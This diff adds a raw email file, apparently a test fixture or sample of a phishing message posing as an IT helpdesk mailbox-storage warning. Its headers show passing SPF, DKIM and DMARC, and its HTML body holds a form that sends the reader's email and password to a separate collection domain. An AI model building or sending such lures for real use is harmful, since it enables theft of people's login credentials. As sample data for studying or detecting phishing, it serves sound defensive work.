@@ -1,0 +1,23 @@
+Received: from mail.it-helpdesk.example (mail.it-helpdesk.example [203.0.113.30])
+        by mx.example.com with ESMTPS id f1
+        for <you@example.com>; Mon, 12 Oct 2026 09:00:00 +0000
+Authentication-Results: mx.example.com;
+       spf=pass smtp.mailfrom=it@it-helpdesk.example;
+       dkim=pass header.d=it-helpdesk.example;
+       dmarc=pass header.from=it-helpdesk.example
+From: IT Helpdesk <it@it-helpdesk.example>
+To: you@example.com
+Subject: Mailbox storage
+Date: Mon, 12 Oct 2026 09:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+<html><body>
+<p>Your mailbox is almost full. Sign in below to keep receiving mail.</p>
+<form action="https://collect.mailbox-quota.example/save" method="post">
+  <input name="email" type="email">
+  <input name="pass" type="password">
+  <button>Keep my mail</button>
+</form>
+<form action="https://survey.it-helpdesk.example/rate"><input name="stars"></form>
+</body></html>
